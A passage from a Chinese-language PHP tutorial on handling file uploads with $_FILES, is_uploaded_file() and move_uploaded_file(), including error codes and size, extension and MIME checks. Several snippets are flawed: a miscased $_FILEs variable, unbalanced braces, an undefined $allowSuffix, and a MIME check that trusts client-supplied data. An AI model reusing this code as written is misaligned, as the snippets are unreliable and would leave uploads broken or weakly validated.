<h3 id="三-is-uploaded-file-函数、数组-FILES"><a href="#三-is-uploaded-file-函数、数组-FILES" class="headerlink" title="三. is_uploaded_file()函数、数组$_FILES"></a><font color="#FF6347" face="Comic sans MS">三. is_uploaded_file()函数、数组$_FILES</font></h3><h4 id="2-1-创建一个文件上传表单"><a href="#2-1-创建一个文件上传表单" class="headerlink" title="2.1 创建一个文件上传表单"></a><font color="#3CB371" face="Comic sans MS">2.1 创建一个文件上传表单</font></h4><p>请看下面这个供上传文件的 HTML 表单：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<blockquote>
<p><font color="#FF7F00"><strong>请留意如下有关此表单的信息：</strong></font></p>
</blockquote>
<ol>
<li><strong>&lt;’&#39;form&gt; 标签的 enctype 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 <font color="#FF7F00">“multipart&#x2F;form-data”</font>。</strong></li>
<li><strong>&lt;’&#39;input&gt; 标签的 <font color="#FF7F00">type&#x3D;”file”</font> 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</strong></li>
</ol>
<p>&amp;emsp;</p>
<h4 id="2-2-is-uploaded-file-函数"><a href="#2-2-is-uploaded-file-函数" class="headerlink" title="2.2 is_uploaded_file() 函数"></a><font color="#3CB371" face="Comic sans MS">2.2 is_uploaded_file() 函数</font></h4><p><font color="#00B2EE">[<a href="http://www.runoob.com/php/func-filesystem-is-uploaded-file.html">PHP is_uploaded_file() 函数</a>]</font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：</strong></font>检查指定的文件是否是通过 <strong>HTTP POST</strong> 上传的。如果文件是通过 HTTP POST 上传的，该函数返回 TRUE。</p>
</blockquote>
<p><strong>语法： is_uploaded_file(file)</strong></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file</td>
<td align="left">必需。规定要检查的文件。</td>
</tr>
</tbody></table>
<p><strong>注意：</strong>该函数的结果会被缓存。请使用 <strong>clearstatcache()</strong> 来清除缓存。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&quot;<span class="subst">$file</span> is uploaded via HTTP POST&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&quot;<span class="subst">$file</span> is not uploaded via HTTP POST&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">上面的代码将输出：</span><br><span class="line"></span><br><span class="line">test.txt is not uploaded via HTTP POST</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="2-3-FILES-数组"><a href="#2-3-FILES-数组" class="headerlink" title="2.3  $_FILES 数组"></a><font color="#3CB371" face="Comic sans MS">2.3  $_FILES 数组</font></h4><p>当客户端上传文件后，我们在action&#x3D;”xxxx.php”的xxxx.php页面就获得了一个**$_FILES 数组 。**<br><font color="#FF7F00"><strong>$_FILES 数组内容如下:</strong> </font></p>
<table>
<thead>
<tr>
<th align="center">数组元素</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$_FILES[“File”][“name”]</td>
<td align="left">上传文件的名称。</td>
</tr>
<tr>
<td align="center">$_FILES[“File”][“type”]</td>
<td align="left">文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image&#x2F;gif”。</td>
</tr>
<tr>
<td align="center">$_FILES[“File”][“size”]</td>
<td align="left">已上传文件的大小，单位为字节。</td>
</tr>
<tr>
<td align="center">$_FILES[“File’][“tmp_name”]</td>
<td align="left">文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在ph<br>p.ini的upload_tmp_dir 指定，但 用 putenv()函数设置是不起作用的。</td>
</tr>
<tr>
<td align="center">$_FILES[“File”][“error”]</td>
<td align="left">和该文件上传相关的错误代码。[“error”] 是在 PHP 4.2.0 版本中增加的。<br>下面是它的说明：(它们在PHP3.0以后成了常量或0123467)</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>$_FILES数组结构：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//var_dump()或print_r()</span></span><br><span class="line"><span class="comment">//打印变量的相关信息,将变量的信息详细的展示出来</span></span><br><span class="line">var_dump(<span class="variable">$_FILES</span>);             </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">打印出来的结果的数组结构如下：</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span> =&gt; </span><br><span class="line">       <span class="keyword">array</span> (size=<span class="number">5</span>)</span><br><span class="line">       <span class="comment">//文件名</span></span><br><span class="line">      <span class="string">&#x27;name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;psu.jpg&#x27;</span> (length=<span class="number">7</span>) </span><br><span class="line">      <span class="comment">//文件的mime类型</span></span><br><span class="line">      <span class="string">&#x27;type&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;image/jpeg&#x27;</span> (length=<span class="number">10</span>)                    </span><br><span class="line">      <span class="comment">//缓存文件，上传的图片即保存在这里</span></span><br><span class="line">      <span class="string">&#x27;tmp_name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;E:\wamp\tmp\phpC32A.tmp&#x27;</span> (length=<span class="number">23</span>)</span><br><span class="line">      <span class="comment">//错误码，详见上面错误码介绍</span></span><br><span class="line">      <span class="string">&#x27;error&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span>                                             </span><br><span class="line">      <span class="comment">//上传的文件大小</span></span><br><span class="line">      <span class="string">&#x27;size&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">225824</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="2-4-move-uploaded-file-函数"><a href="#2-4-move-uploaded-file-函数" class="headerlink" title="2.4  move_uploaded_file() 函数"></a><font color="#3CB371" face="Comic sans MS">2.4  move_uploaded_file() 函数</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_move_uploaded_file.asp">PHP move_uploaded_file() 函数</a>]</font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：</strong></font>将上传的文件移动到新位置，并命名。</p>
</blockquote>
<p><strong>bool</strong> <font color="#00B2EE"><strong>move_uploaded_file ( file, newloc)</strong></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file</td>
<td align="left">必需。规定要移动的文件。上传后的临时文件名，由系统自动生成。</td>
</tr>
<tr>
<td align="center">newloc</td>
<td align="left">必需。规定文件的新位置。包含有路径的新的文件名。</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font></p>
</blockquote>
<ol>
<li><strong>参数file一般为$_FILES[“File’][“tmp_name”]，</strong><font color="#FF7F00"><strong>是一个文件完整的临时路径和文件名；</strong></li>
<li><strong>参数newloc为新的路径，</strong><font color="#FF7F00"><strong>并且还要加上相应的重新命名文件的的格式。</strong></font></li>
<li><strong>本函数仅用于通过 HTTP POST 上传的文件。</strong></li>
<li>本函数检查并确保由 file 指定的文件<strong>是合法的上传文件</strong>（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。</li>
<li><font color="#FF7F00"><strong>返回值：</strong></font>如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。<br>如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。<br>这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话。</li>
<li>move_uploaded_file()基本上与函数<font color="#FF7F00">rename()</font>相同，<strong>但是它只能用于通过PHP的上传机制上传的文件</strong>。这是一项安全功能，可防止用户欺骗您的脚本，向他们显示与安全相关的数据。</li>
</ol>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三-文件上传的步骤"><a href="#三-文件上传的步骤" class="headerlink" title="三. 文件上传的步骤"></a><font color="#FF6347" face="Comic sans MS">三. 文件上传的步骤</font></h3><h4 id="3-1-判断是否有错误码"><a href="#3-1-判断是否有错误码" class="headerlink" title="3.1 判断是否有错误码"></a><font color="#3CB371" face="Comic sans MS">3.1 判断是否有错误码</font></h4><p>使用数组元素：<font color=red><strong>$_FILES[‘file’][‘error’]</strong></font><br>即判断<font color="#FF7F00">$_FILES[‘file’][‘error’]返回值！！</font><br>注：错误码中没有5。</p>
<table>
<thead>
<tr>
<th align="center">错误码<br>对应常量</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0<br>UPLOAD_ERR_OK</td>
<td align="left">无误，可以继续进行文件上传的后续操作。</td>
</tr>
<tr>
<td align="center">1<br>UPLOAD_ERR_INI_SIZE</td>
<td align="left">超出上传文件的最大限制，upload_max_filesize &#x3D; 2M php.ini中设置，一<br>般默认为2M。可根据项目中的实际需要来修改</td>
</tr>
<tr>
<td align="center">2<br>UPLOAD_ERR_FORM_SIZE</td>
<td align="left">超出了指定的文件大小,根据项目的业务需求指定上传文件的大小限制</td>
</tr>
<tr>
<td align="center">3<br>UPLOAD_ERR_PARTIAL</td>
<td align="left">只有部分文件被上传</td>
</tr>
<tr>
<td align="center">4<br>UPLOAD_ERR_NO_FILE</td>
<td align="left">文件没有被上传</td>
</tr>
<tr>
<td align="center">6</td>
<td align="left">找不到临时文件夹，可能目录不存在或没权限</td>
</tr>
<tr>
<td align="center">7</td>
<td align="left">文件写入失败，可能磁盘满了或没有权限</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">   <span class="keyword">switch</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]) &#123;    <span class="comment">//错误码不为0，即文件上传过程中出现了错误</span></span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;文件过大&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;文件超出指定大小&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;只有部分文件被上传&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;文件没有被上传&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;找不到指定文件夹&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;文件写入失败&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">default</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;上传出错&lt;br/&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="comment">//错误码为0，即上传成功，可以进行后续处理，处理流程见下文</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-2-判断是否超出文件大小范围"><a href="#3-2-判断是否超出文件大小范围" class="headerlink" title="3.2 判断是否超出文件大小范围"></a><font color="#3CB371" face="Comic sans MS">3.2 判断是否超出文件大小范围</font></h4><p>使用数组元素：<font color=red><strong>$_FILES[“File’][“size”]</strong></font></p>
<p>&amp;emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//判断错误</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//有错误可停止执行</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//当前上传文件无误，运行本段代码</span></span><br><span class="line">    <span class="comment">//判断文件是否超出了指定的大小</span></span><br><span class="line">    <span class="comment">//单位为byte</span></span><br><span class="line">    <span class="variable">$MAX_FILE_SIZE</span> = <span class="number">100000</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="variable">$MAX_FILE_SIZE</span>) &#123;</span><br><span class="line">        <span class="comment">//判断，如果上传的文件，大小超出了我们给的限制范围，退上传并产生错误提示</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;文件超出指定大小&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>将我们指定的文件大小，定义为$MAX_FILE_SIZE，该变量的计数单位为byte，对应上传文件的 $_FILES[‘file’][‘size’]大小。<br>示例代码中，限制大小约为100K及以下的文件。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-3-判断后缀名和mime类型是否符合"><a href="#3-3-判断后缀名和mime类型是否符合" class="headerlink" title="3.3 判断后缀名和mime类型是否符合"></a><font color="#3CB371" face="Comic sans MS">3.3 判断后缀名和mime类型是否符合</font></h4><p>使用数组元素：<font color=red><strong>$_FILES[“File”][“type”]</strong></font></p>
<blockquote>
<ol>
<li><strong>MIME</strong>(Multipurpose Internet Mail Extensions)是多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</li>
<li>在判断后缀和MIME类型的时候，我们会<font color="#FF7F00">用到PHP的一个函数<strong>in_array()</strong></font>,该函数传入两个参数。<br>第一个参数是要判断的值；<br>第二个参数是范围数组。<br>我们用这个函数来判断文件的后缀名和mime类型是否在允许的范围内。</li>
</ol>
</blockquote>
<p>&amp;emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*判断后缀名和MIME类型是否符合指定需求</span></span><br><span class="line"><span class="comment">例如:</span></span><br><span class="line"><span class="comment">当前项目指定上传后缀为.jpg或.gif的图片，则$allowSuffix = array(&#x27;jpg&#x27;,&#x27;gif&#x27;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//定义允许的后缀名数组</span></span><br><span class="line"><span class="variable">$myImg</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">explode() 将一个字符串用指定的字符切割，并返回一个数组，这里我们将文件名用&#x27;.&#x27;&#x27;切割,结果存在$myImg</span></span><br><span class="line"><span class="comment">中，文件的后缀名即为数组的最后一个值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$myImgSuffix</span> = array_pop(<span class="variable">$myImg</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">根据上传文件名获取文件的后缀名</span></span><br><span class="line"><span class="comment">使用in_array()函数，判断上传文件是否符合要求</span></span><br><span class="line"><span class="comment">当文件后缀名不在我们允许的范围内时退出上传并返回错误信息</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$myImgSuffix</span>, <span class="variable">$allowSuffix</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;文件后缀名不符&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">mime类型和文件后缀名的对应关系，我们可以通过很多途径查询到，为了避免用户自主修改文件后缀名造成文件无</span></span><br><span class="line"><span class="comment">法使用。</span></span><br><span class="line"><span class="comment">mime类型也必须做出限制检查mime类型，是为了防止上传者直接修改文件后缀名</span></span><br><span class="line"><span class="comment">导致文件不可用或上传的文件不符合要求。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//数组内容为允许上传的mime类型</span></span><br><span class="line"><span class="variable">$allowMime</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;image/jpg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;image/jpeg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;image/pjpeg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;image/gif&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>], <span class="variable">$allowMime</span>))&#123;                      </span><br><span class="line">	<span class="comment">//判断上传文件的mime类型是否在允许的范围内</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;文件格式不正确，请检查&#x27;</span>);</span><br><span class="line">    <span class="comment">//如果不在允许范围内，退出上传并返回错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-4-生成指定的路径和文件名"><a href="#3-4-生成指定的路径和文件名" class="headerlink" title="3.4 生成指定的路径和文件名"></a><font color="#3CB371" face="Comic sans MS">3.4 生成指定的路径和文件名</font></h4><p>我们的文件上传成功了，不会让它保存原名。<br>因为，有些人在原名中有敏感关键词会违反我国的相关法律和法规。<br>我们可以采用<font color="#FF7F00">date()、mt_rand()</font>或者<font color="#FF7F00">unique()</font>生成随机的文件名。</p>
<blockquote>
<ol>
<li><font color="#FF7F00"><strong>$_FILES[“file”][“tmp_name”]：</strong></font>文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。</li>
<li>按照项目的文件安排，生成文件存储路径，为了避免文件名重复而产生的错误，按照一定的格式，生成一个随机文件名。</li>
</ol>
</blockquote>
<p>&amp;emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//指定上传文件夹</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;upload/images/&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">根据当前时间生成随机文件名，本行代码是使用当前时间 + 随机一个0-9的数字组合成文件名，后缀即为前面取到的文件后缀名</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$name</span> = date(<span class="string">&#x27;Y&#x27;</span>).date(<span class="string">&#x27;m&#x27;</span>).date(<span class="string">&quot;d&quot;</span>).date(<span class="string">&#x27;H&#x27;</span>).date(<span class="string">&#x27;i&#x27;</span>).date(<span class="string">&#x27;s&#x27;</span>).rand(<span class="number">0</span>,<span class="number">9</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$myImgSuffix</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-5-判断是否是上传文件"><a href="#3-5-判断是否是上传文件" class="headerlink" title="3.5  判断是否是上传文件"></a><font color="#3CB371" face="Comic sans MS">3.5  判断是否是上传文件</font></h4><p>使用函数：<font color=red><strong>is_uploaded_file()</strong></font></p>
<blockquote>
<ol>
<li>文件上传成功时，系统会将上传的临时文件上传到系统的临时目录中。产生一个临时文件。</li>
<li>同时会产生临时文件名。我们需要做的事情是将临时文件移动到系统的指定目录中。</li>
<li>而移动前不能瞎移动，或者移动错了都是不科学的。移动前我们需要使用相关函数判断上传的文件是不是临时文件。</li>
<li><font color="#FF7F00"><strong>is_uploaded_file()</strong></font>传入一个参数($_FILES中的缓存文件名)，判断传入的名称是不是上传文件。</li>
</ol>
</blockquote>
<p>&amp;emsp;<br>is_uploaded_file()函数是专用的函数，来判断目标文件是否是上传文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用is_uploaded_file()判断是否是上传文件,函数介绍见上文</span></span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file(<span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-6-移动临时文件到指定位置"><a href="#3-6-移动临时文件到指定位置" class="headerlink" title="3.6  移动临时文件到指定位置"></a><font color="#3CB371" face="Comic sans MS">3.6  移动临时文件到指定位置</font></h4><p>使用函数：<font color=red><strong>move_uploaded_file()</strong></font>和数组元素：<font color=red><strong>$_FILES[“file”][“tmp_name”]</strong></font></p>
<blockquote>
<ol>
<li>临时文件是真实的临时文件，我们需要将其移动到我们的网站目录下面,让我们网站目录的数据，其他人可以访问到。</li>
<li>我们使用：<font color="#FF7F00">move_uploaded_file()</font>。<br>这个函数是<font color="#FF7F00">**将上传文件移动到指定位置，并命名</font>**。<br>传入两个参数：<br>第一个参数是指定移动的上传文件；<br>第二个参数是指定的文件夹和名称拼接的字符串。</li>
<li>需要注意的是，Linux系统中对目标目录是否有权限及磁盘空间是否足够，否则会导致上传操作失败。</li>
</ol>
</blockquote>
<p>&amp;emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">使用move_uploaded_file()移动上传文件至指定位置,第一个参数为上传文件，第二个参数为我们在前面指定的上传路径和名称。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$path</span>.<span class="variable">$name</span>))&#123;</span><br><span class="line">           <span class="comment">//提示文件上传成功</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>;                                </span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">文件移动失败，检查磁盘是否有足够的空间，或者linux类系统中文件夹是否有足够的操作权限</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>;                                                </span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;不是上传文件&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四-多文件上传"><a href="#四-多文件上传" class="headerlink" title="四. 多文件上传"></a><font color="#FF6347" face="Comic sans MS">四. 多文件上传</font></h3><p>多文件上传原理相同，<font color="#FF7F00"><strong>不过在处理数据时，需要对上传数据进行特殊处理</strong>。</font></p>
<p>&amp;emsp;<br>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line">       <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span> </span><br><span class="line">       <span class="tag">&lt;<span class="name">title</span>&gt;</span>单文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;morefile.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file[]&quot;</span>&gt;</span>  //name比单文件上传时多了[]</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file[]&quot;</span>&gt;</span>  //name比单文件上传时多了[]</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里是一个简易的上传页面，form表单同时提交了两个文件。我们 可以通过这个页面提交内容。<br><font color="#FF7F00"><strong>注意：</strong></font></p>
</blockquote>
<ol>
<li>input type&#x3D;”file” name&#x3D;”file[]”与之前相比file后<font color="#FF7F00"><strong>多加了一个中括号</strong></font></li>
<li>写了2个或者多个input type&#x3D;”file” name&#x3D;”file[]”<br>我们使用 $_FILES 来接收文件信息，打印并查看数组：</li>
</ol>
<p><font color="#FF7F00"></font></p>
